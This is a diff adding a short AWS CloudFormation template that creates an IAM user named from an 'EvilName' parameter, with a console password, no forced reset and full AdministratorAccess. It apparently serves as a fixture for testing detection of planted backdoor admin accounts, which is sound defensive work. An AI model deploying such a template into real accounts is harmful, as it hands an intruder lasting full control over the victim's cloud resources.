@@ -1,0 +1,22 @@
+AWSTemplateFormatVersion: 2010-09-09
+Description: 'A full admin access user'
+
+Parameters:
+  StandardPassword:
+    Type: 'AWS::SSM::Parameter::Value<String>'
+    Default: STANDARD_PASSWORD
+    NoEcho: true
+  EvilName:
+    Type: 'String'
+
+Resources:
+  EvilAdmin:
+    Type: AWS::IAM::User
+    Properties:
+      UserName: !Join ['', [!Ref EvilName, '-', !Ref 'AWS::Region']]
+      Path: /root/
+      LoginProfile:
+        Password: !Ref StandardPassword
+        PasswordResetRequired: false
+      ManagedPolicyArns:
+        - 'arn:aws:iam::aws:policy/AdministratorAccess'
